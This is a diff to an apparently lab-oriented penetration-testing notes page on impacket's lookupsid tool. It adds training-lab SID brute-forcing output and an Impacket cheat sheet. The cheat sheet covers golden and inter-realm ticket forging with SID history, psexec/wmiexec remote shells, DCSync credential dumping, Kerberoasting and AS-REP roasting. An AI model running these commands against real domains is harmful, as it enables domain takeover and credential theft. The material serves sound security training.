@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=lookupsid) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -21,8 +23,148 @@ impacket-lookupsid 'DOMAIN/USER@DC_IP'
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=lookupsid)
+## Notebook recipes
 
-## Learning and original examples
+6 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Active Directory Enumeration from Linux](/active-directory/enumeration-linux)
+<AccordionGroup>
+
+<Accordion title="Cross-domain / cross-forest">
+
+### Cross-domain / cross-forest
+
+**Active Directory Trusts: Quick Reference**
+
+```bash
+# child -> parent: forge an inter-realm TGT with the child krbtgt + SID history (sidHistory of Enterprise Admins)
+ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <root_sid>-519 -domain child.corp.local Administrator
+# intra-forest trust key abuse
+lookupsid.py $DOMAIN/USER:PASS@$DC       # get SIDs
+```
+
+</Accordion>
+
+<Accordion title="Grabbing the Domain SID &amp; Attaching to Enterprise Admin&#x27;s RID">
+
+### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+Password:
+[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\administrator (SidTypeUser)
+501: INLANEFREIGHT\guest (SidTypeUser)
+502: INLANEFREIGHT\krbtgt (SidTypeUser)
+512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
+513: INLANEFREIGHT\Domain Users (SidTypeGroup)
+514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
+515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
+516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
+517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
+518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
+519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+```
+
+</Accordion>
+
+<Accordion title="Looking for the Domain SID">
+
+### Looking for the Domain SID
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+Password:
+
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+```
+
+</Accordion>
+
+<Accordion title="Performing SID Brute Forcing using lookupsid.py">
+
+### Performing SID Brute Forcing using lookupsid.py
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at 172.16.5.240
+[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+500: LOGISTICS\Administrator (SidTypeUser)
+501: LOGISTICS\Guest (SidTypeUser)
+502: LOGISTICS\krbtgt (SidTypeUser)
+512: LOGISTICS\Domain Admins (SidTypeGroup)
+513: LOGISTICS\Domain Users (SidTypeGroup)
+514: LOGISTICS\Domain Guests (SidTypeGroup)
+515: LOGISTICS\Domain Computers (SidTypeGroup)
+516: LOGISTICS\Domain Controllers (SidTypeGroup)
+517: LOGISTICS\Cert Publishers (SidTypeAlias)
+520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
+521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
+522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
+525: LOGISTICS\Protected Users (SidTypeGroup)
+526: LOGISTICS\Key Admins (SidTypeGroup)
+553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
+571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
+572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
+1001: LOGISTICS\lab_adm (SidTypeUser)
+1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
+1103: LOGISTICS\DnsAdmins (SidTypeAlias)
+1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
+1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
+1106: LOGISTICS\htb-student_adm (SidTypeUser)
+```
+
+</Accordion>
+
+<Accordion title="Original captured examples">
+
+### Original captured examples
+
+**Impacket: Script Quick Reference**
+
+```bash
+# remote execution (need admin creds or hash)
+psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
+wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
+smbexec.py / atexec.py / dcomexec.py        # alternatives
+# credentials
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
+GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
+# tickets
+getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
+ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
+# shares / lookups
+smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
+```
+
+</Accordion>
+
+<Accordion title="Impacket: Script Quick Reference">
+
+### Impacket: Script Quick Reference
+
+**Impacket: Script Quick Reference**
+
+Context from the notebook: SID lookup over SMB/RPC lookupsid.py  /  impacket-lookupsid AD enumeration
+
+```text
+lookupsid.py
+```
+
+</Accordion>
+
+</AccordionGroup>
